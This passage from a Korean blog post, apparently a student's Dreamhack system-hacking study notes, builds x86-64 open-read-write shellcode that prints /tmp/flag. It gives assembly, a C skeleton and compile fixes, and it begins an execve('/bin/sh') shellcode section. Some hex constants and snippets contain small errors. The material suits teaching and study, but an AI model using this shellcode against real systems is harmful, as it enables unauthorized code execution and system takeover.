&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RD_ONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 목표 파일의 포인터와 접근 모드 가져오기&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 파일을 읽어 오기&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1번, 즉 stdout인 콘솔에 읽어 온 buf 출력하기&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;여기에서 사용된 syscall은 총 세 가지, open, read, write 였다. 해당 syscall들의 상세 사양들을 알아보자.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;셸코드 작성에 필요한 syscall 목록&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0 (rdi)&lt;/th&gt;
          &lt;th&gt;arg1 (rsi)&lt;/th&gt;
          &lt;th&gt;arg2 (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;read&lt;/td&gt;
          &lt;td&gt;0x00&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;write&lt;/td&gt;
          &lt;td&gt;0x01&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;const char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;open&lt;/td&gt;
          &lt;td&gt;0x02&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;int flags&lt;/td&gt;
          &lt;td&gt;umode_t mode&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;관련해 기억나는 게 있을 것이다… 그렇다! &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2-2/#/&quot;&gt;이전 포스팅&lt;/a&gt;에서 이미 비슷한 내용을 다룬 적 있다.&lt;/p&gt;

&lt;p&gt;syscall 어셈블리 명령이 실행되면 CPU는 rax부터 쳐다본다. syscall 테이블의 인덱스와 rax 내부의 값을 대조해 지금 실행하려는 syscall이 어떤 종류인지 알고 싶어서이다. 그 이후 유저 권한에서 시스콜을 요청한다면 rdi→rsi→rdx→rcx→r8→r9→stack 의 순서로 레지스터를 확인해 arguments를 가져간다.&lt;/p&gt;

&lt;h2 id=&quot;셸코드-작성하기&quot;&gt;셸코드 작성하기&lt;/h2&gt;

&lt;h3 id=&quot;1-int-fd--opentmpflag-o_rdonly-null&quot;&gt;1. int fd = open(”/tmp/flag”, O_RDONLY, NULL)&lt;/h3&gt;

&lt;p&gt;리눅스 시스템 콜 중 open 시스템 콜의 용법은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;문서를 읽어 보니&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;flags는 반드시 access modes중 하나를 가지고 있어야 했다. access modes의 종류는 아래와 같다. 플래그는 문자열이 아닌 바이너리 값(숫자)로 들어간다는 것을 알고 있자!
    &lt;ul&gt;
      &lt;li&gt;O_RDONLY: read-only //0x00&lt;/li&gt;
      &lt;li&gt;O_WRONLY: write-only //0x01&lt;/li&gt;
      &lt;li&gt;O_RDWR: read/write //0x02&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mode_t mode&lt;/code&gt; 파라미터는 만일 없는 파일을 참조할 때 플래그에 O_CREAT나 O_TMPFILE이 설정되어 있으면 파일을 새로 만드는데, 이 때 새로 만들어질 파일에 대한 유저의 권한을 정의한다. 역으로 말해서, 앞서 언급한 두 플래그가 설정되어 있지 않다면 무시해도 된다. 무시해도 되는 상황을 만들어서 실제로 디버거를 켜서 확인해 보니, mode argument가 들어가는 rdx에 전혀 신경쓰지 않는 동작을 확인할 수 있었다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;즉 우리는 read-only 모드로 액세스하고 싶으며 다른 플래그를 설정하지 않을 것이므로&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int open(const char *pathname, int flags);&lt;/code&gt; 형태로 시스콜을 사용할 수 있다.&lt;/p&gt;

&lt;p&gt;syscall 어셈블리어가 실행될 때 rax에는 0x02, rdi에는 “/tmp/flag”라는 문자열(엔디안 고려)의 시작 주소(문자열은 보통 시작 주소 포인터로 접근하므로), rsi에는 O_RDONLY의 고유값인 0x00이 들어가 있어야 한다.&lt;/p&gt;

&lt;p&gt;또한 스택에는 큰 주소부터 차곡차곡 작은 주소로 데이터가 입력된다. &lt;del&gt;스트링 데이터를 넣는 것이므로 엔디언을 고려할 필요 없다.(이건 내 추측)&lt;/del&gt; 즉 이를 고려하면 “/tmp/flag”를 스택에 넣어줘야 하고, 이 값을 아스키 코드의 hex로 변환했을 때 아래와 같은 값이 나온다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x67616c662f705d742f&lt;/code&gt; = galf/pmt/&lt;/p&gt;

&lt;p&gt;이제까지 도출한 정보를 정리해 어셈블리어로 표현하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rax, 0x02 ; syscall:open
mov r8, 0x67616c662f705d742f
push r8
mov rdi, rsp ; start address of &quot;/tmp/flag&quot;
xor rsi, rsi ; rsi=0, O_RDONLY
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;2-readfd-buf-0x30&quot;&gt;2. read(fd, buf, 0x30)&lt;/h3&gt;

&lt;p&gt;open() 시스콜은 file descripter를 리턴한다. 이 file descripter는 양의 정수로 파일 시스템에서 파일에 접근할 수 있게 해주는 테이블의 인덱스이다. 자세한 내용은 리눅스의 파일 시스템을 공부하면 알 수 있다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;fd: 시스콜의 리턴값은 rax에 저장되므로, read를 수행하기 위해서는 앞서 정의한 어셈블리어를 수행한 직후 rax의 값에 접근해야 한다. 즉, rax의 값을 살리기 위해 read()의 arguments중 첫번째인 fd가 저장되는 rdi에 rax를 미리 넣어두고 동작을 지시해야 한다.&lt;/li&gt;
  &lt;li&gt;buf: 이는 프로그램의 함수 내에서 선언된 지역 변수이기 때문에 스택에 자리를 만드는 것이 응당하다. 따라서 스택에 0x30만큼의 자리를 확보해 준다. 즉, [rsp-0x30]을 해당 버퍼의 시작 주소로 지정해 주면 된다(스택은 큰 주소에서 작은 주소로 자라나기 때문에, 스택의 꼭대기인 rsp가 가리키는 곳에서 0x30만큼 작아진 곳이라면 스택의 데이터를 망치지 않는 곳에 공간을 확보한 것이 된다). 그에 맞게 두번째 arguement가 저장되는 rsi에 [rsp-0x30]을 넣어주면 된다.&lt;/li&gt;
  &lt;li&gt;0x30: 파일에서 읽어낼 길이이며, 세번째 argument이므로 rdx에 그 값을 저장한다. 이 경우에는 rdx에 0x30을 넣어주면 된다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;rax에 있던 리턴값을 저장한 이후 read syscall을 사용하기 위해 rax를 0x00으로 설정해 준다.&lt;/p&gt;

&lt;p&gt;이 정보를 어셈블리어로 정리하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rdi, rax
lea rsi, [rsp-0x30] // == mov rsi, rsp  -&amp;gt;  sub rsi, 0x30 //  mov rsi, [rsp-0x30] : 이게 가능한 이유는 rsp와 rbp가 스택의 끝과 시작을 가리키는 포인터이기 때문이다. 
// 즉, 레지스터 내부에 있는 값이 가리키는 주소가 바로 스택의 시작과 끝이다. 레지스터에 있는 값을 변경하면 바로 스택의 시작과 끝을 기준으로 이동한 위치에 접근할 수 있다.
mov rdx, 0x30
mov rax, 0x00
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;3-write1-buf-0x30&quot;&gt;3. write(1, buf, 0x30)&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;첫 번째 argument인 출력 위치는 rdi를 참조하므로 rdi를 0x01로 지정한다.&lt;/li&gt;
  &lt;li&gt;두번째 argument인 buf의 시작주소는 rsi를 참조하므로 rsi를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; 로 지정해 준다. (2번 과정에서 이미 rsp를 원하는 대로 변경해 줬기 때문이다)&lt;/li&gt;
  &lt;li&gt;세번째 argument, 쓸 데이터의 길이인 0x30은 rdx에 저장되므로 rdx에 0x30을 넣어준다.&lt;/li&gt;
  &lt;li&gt;write syscall을 사용하기 위해 rax를 0x01로 설정해 준다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이 정보를 어셈블리어로 정리하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rdi, 0x01
lea rsi, [rsp-0x30]
mov rdx, 0x30
mov rax, 0x01
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;4-정말-중요한-이야기-헷갈리지-말자-rsp-rbp의-의미&quot;&gt;4. 정말 중요한 이야기-헷갈리지 말자! (rsp, rbp의 의미)&lt;/h3&gt;

&lt;p&gt;문득 굉장히 이상한 점이 느껴진다. 사실 드림핵 자료에 나와 있는 어셈블리어의 원본은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea rsi, [rsp-0x30]&lt;/code&gt; 이 아니라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp -&amp;gt; sub rsi, 0x30&lt;/code&gt; 이다. 다른 말로 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, [rsp-0x30]&lt;/code&gt; 으로 rsp에 저장된 값에서 0x30을 뺀 값을 rsi가 가진다는 말이 된다.&lt;/p&gt;

&lt;p&gt;즉, rsp와 rbp 등의 레지스터는 그 자체가 스택의 시작과 끝에 위치한 게 아니라, 그 안에 저장된 값이 스택의 시작과 끝의 메모리 주소인 것이다. 애초에 CPU 내부에 있는 레지스터가 어떻게 메모리의 주소를 가질 수 있겠느냐만은, 나는 초보자인지라 개념을 헷갈리는 바람에 ‘이상하다, rsp는 스택의 끝일 텐데 왜 rsp 내부의 값에서 0x30을 뺀 게 스택의 끝에서 0x30 내려온 주소에 접근하는 결과가 되는 거지?’라는 고민에 골머리를 앓았었다. 결국 디버거를 이용해 어셈블리어를 확인하고 ‘맞다 이거 레지스터였다’라는 깨달음을 얻게 되기까지 시간 꽤나 잡아먹었다… 다른 초보자 분들은 이런 착각을 하시더라도 이 글을 보고 빠른 정정 하시길 바란다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;고등학생 시절 수학을 독학할 때가 생각난다. 그때도 이렇게 개념이 확실하게 체화되지 않은 상태에서 응용하다가 개념 자체를 헷갈려서 맞닥뜨리는 문제에 많이 맞닥뜨렸었다. 시간이 흐른 뒤 다시 해당 문제를 돌아보니 내가 왜 그걸 문제점으로 생각했는지 자체를 황당해하게 되더라. 아마도 나중에 내가 이걸 읽어보면 똑같은 기분을 느끼지 않을까. 푸하하하&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;5-종합&quot;&gt;5. 종합&lt;/h3&gt;

&lt;p&gt;이제까지 쓴 어셈블리 코드를 모두 종합하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;; open()
mov rax, 0x02 ; syscall:open
mov r8, 0x67616c662f705d742f ; 드림핵 자료에서는 먼저 스택에 0x67을 넣고 뒤의 데이터를 rax에 넣은 후 rax의 데이터를 스택에 넣어주는데, 왜 그렇게 했지? 이유 아는 분은 알려주세요.
; 글로벌 보안캠프에서 만났던 친구가 가끔 어셈블리어 코드는 비효율적인 행동을 한댔는데, 그것 때문인가...
push r8
mov rdi, rsp ; start address of &quot;/tmp/flag&quot;
xor rsi, rsi ; rsi=0, O_RDONLY
syscall

; read()
mov rdi, rax
lea rsi, [rsp-0x30] ; == mov rsi, rsp  -&amp;gt;  sub rsi, 0x30 //  mov rsi, [rsp-0x30] : 이게 가능한 이유는 rsp와 rbp가 스택의 끝과 시작을 가리키는 포인터이기 때문이다. 
; 즉, 레지스터 내부에 있는 값이 가리키는 주소가 바로 스택의 시작과 끝이다. 레지스터에 있는 값을 변경하면 바로 스택의 시작과 끝을 기준으로 이동한 위치에 접근할 수 있다.
mov rdx, 0x30
mov rax, 0x00
syscall

; write()
mov rdi, 0x01
lea rsi, [rsp-0x30]
mov rdx, 0x30
mov rax, 0x01
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;orw-셸코드-컴파일-및-실행&quot;&gt;orw 셸코드 컴파일 및 실행&lt;/h2&gt;

&lt;p&gt;셸코드는 그냥 기계어로 번역하면 CPU가 이해할 수는 있지만 실행 파일의 형식이 아니기 때문에 시스템이 이것을 실행해야 한다는 사실을 몰라서 실행하지 않게 된다. 따라서 gcc 컴파일러를 통해 어셈블리어를 저장한 소스 파일인 orw.S 파일을 ELF 파일 형식으로 변형해 줘야 한다.&lt;/p&gt;

&lt;p&gt;어셈블리 코드를 컴파일하는 방법에는 여러 가지가 있지만, 이번 코스에서 배운 것은 c 언어로 스켈레톤 코드를 작성한 후 그 위에 셸코드를 얹어서 실행하도록 하는 것이었다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;스켈레톤 코드: 핵심 내용이 비어있는, 기본 구조만 갖춘 코드. 그 안에 핵심 내용으로 셸코드를 집어넣어 컴파일함으로써 셸코드를 컴파일할 수 있다&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;.global run_sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;run_sh:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov r8, 0x67616c662f706d742f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push r8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rsi, rsi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rax&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;lea rsi, [rsp-0x30]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdx, 0x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, 0x01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;lea rsi, [rsp-0x30]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdx, 0x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;xor rdi, rdi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C언어에서 어셈블리어 명령을 끼워넣으려면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm__(&quot;one line&quot;)&lt;/code&gt; 으로 수행하거나, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm{multi line}&lt;/code&gt; 으로 수행하면 되는데, XCode(맥북의 그것 맞다)에 있는 gcc가 아니라면 VC에서 하는 것처럼 어셈블럭을 사용하는 것이 먹히지 않는다.(최근에 업데이트 됐다면 내가 틀렸을 것이다) 그래서 한 줄씩 작성해야 하는 전자의 방식을 채택한 것으로 추측한다.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;그러나 궁금한 점. main 함수 안에 넣어도 되는데 왜 저렇게 분리했는지 모르겠고, run_sh() 함수는 어셈블리어를 포함하는 것이 아닌 걸로 보이는데 왜 run_sh를 만들어 넣은 것인지 의문이다. 누가 좀 알려주라….&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;아무튼, 이렇게 쓰고 컴파일을 돌렸는데…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%201.jpeg&quot; alt=&quot;어라? 이상한 오류가 생겼다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어라? 이상한 오류가 생겼다.&lt;/p&gt;

&lt;p&gt;‘missing or invalid immediate expression’. immediate 형의 데이터가 올바르지 않은 규격이라는 뜻 같았다. 대체 왜 이런 오류가 뜨지? 궁금해서 찾아봤다.&lt;/p&gt;

&lt;p&gt;먼저 어셈블리어에서 immediate가 들어가는 용어는 두 가지가 있었다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;immediate expression: 인스트럭션에 value가 하드코딩되어 있을 때 이를 칭하는 용어&lt;/li&gt;
  &lt;li&gt;immediate addressing: 인스트럭션(opcode + operand)의 operand에 immediate data가 존재하는 것으로, 주소를 직설적으로 지정해 주는 것&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;다만, 이렇게 immediate가 붙는 방식에는 무조건 제한이 있었다. 바로 ‘데이터 크기가 address 영역 사이즈만큼 제한된다’ 는 점이었다. 애초에 operand가 opcode 실행 시 사용할 데이터의 주소를 나타내기 위한 영역이기 때문이다. 또한 immediate의 길이는 instruction의 길이 제한이 설정되어 있다면 그것에도 영향을 받는다.&lt;/p&gt;

&lt;p&gt;현재 내가 사용하고 있는 환경은 리눅스 x86-64 64bit이고, 메모리 address 표현 방식은 64bit로 표현된다. 전자의 64bit는 word 수이고 후자는 메모리 주소의 길이이므로 헷갈리면 안 된다.&lt;/p&gt;

&lt;p&gt;즉 메모리 주소가 64bit이기 때문에 내가 집어넣을 수 있는 immediate data의 길이 한계는 64bit일 것이다.&lt;/p&gt;

&lt;p&gt;따라서  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov r8, 0x67616c662f705d742f\n&lt;/code&gt; 를 내 환경이 소화할 수 있는 인스트럭션으로 바꾸어 주면,&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov r8, 0x616c662f706d742f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push r8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 된다.&lt;/p&gt;

&lt;p&gt;이렇게 고쳐서 컴파일을 시도하니 아무 오류 없이 성공할 수 있었다!&lt;/p&gt;

&lt;p&gt;이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/flag&lt;/code&gt; 파일을 만들어 그 안에 원하는 내용을(48 바이트 이내) 써둔 후, 컴파일한 셸코드를 실행하면 해당 내용이 콘솔에 출력되게끔 할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%202.jpeg&quot; alt=&quot;실제로 실행한 결과.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;실제로 실행한 결과.&lt;/p&gt;

&lt;p&gt;gdb에 orw를 물려서 실행 과정을 살펴봤는데, 내가 입력하고 싶은 스트링이 쭈루룩 들어가고 의도했던 시스콜이 알맞은 인자를 가지고 제대로 돌아가는 걸 눈으로 직접 확인하니 너무 신기하고 재미있었다. 히히&lt;/p&gt;

&lt;p&gt;그런데 이상한 점. 플래그의 글자 수를 세어 보면 29글자로 원래 의도했던 48바이트보다 한참 작은 크기의 문자열을 읽어왔음을 알 수 있다. 이러면 29바이트 + 19바이트 쯤으로 뒤에 쓰레기값이 붙어 나와야 하는데(드림핵 자료에서도 동일한 이야기를 하고 있다)…. 나는 왜 안 나오지? ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ 이상한데…&lt;/p&gt;

&lt;aside&gt;
⚙ Uninitialized Memory &lt;br /&gt;
  
스택은 각 함수별로 스택 프레임이라는 제도를 만들어 공간을 분리해 사용하는, 일종의 함수간 공유 자원으로 정의될 수 있다. 그러나 어떤 함수를 수행하고 다시 원래의 함수로 돌아올 때, 직전의 함수의 스택 프레임 영역을 0으로 초기화하는 게 아니라(Uninitialized Memory) 그냥 rbp와 rsp의 위치만 옮겨 오는 원리로 스택을 관리하기 때문에 이전 스택 프레임의 데이터는 고스란히 남아 있게 된다. 이것이 바로 쓰레기 값(garbage data)이다.

이런 쓰레기 값에 잘 접근하면 프로세스가 프로그래머의 의도와는 다른 동작을 하도록 만들 수 도 있고, 중요한 정보를 읽어낼(Memory Leak) 수도 있다. 이런 걸 막기 위해 시큐어 코딩이라는 것을 하는데, 그건 KISA 들어가서 찾아보면 지침서가 나오니 관심 있는 사람들은 그쪽을 참고하시길!

&lt;/aside&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;execve-셸코드&quot;&gt;execve 셸코드&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;일반적으로 셸코드라고 부르는 것은 모두 이 셸코드&lt;/li&gt;
  &lt;li&gt;execve 명령어가 셸을 실행시키는 것이기 때문에 이 명령어를 실행시킬 수만 있다면 해당 시스템의 제어 권한을 획득할 수 있게 된다.&lt;/li&gt;
  &lt;li&gt;최신의 리눅스가 사용하는 기본 셸 프로그램은 sh, bash이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;execvebinsh-null-null&quot;&gt;execve(”/bin/sh”, null, null)&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;execve 코드는 오로지 execve 시스템 콜만으로 구성된다.&lt;/li&gt;
  &lt;li&gt;execve를 실행한 프로그램이 execve가 실행한 프로그램으로 대체된다. (완전히 덮어씌워진다-OS에서 배울 수 있다)&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;execve system call format&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0 (rdi)&lt;/th&gt;
          &lt;th&gt;arg1 (rsi)&lt;/th&gt;
          &lt;th&gt;arg2 (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;execve&lt;/td&gt;
          &lt;td&gt;0x3b&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;const char *const *argv&lt;/td&gt;
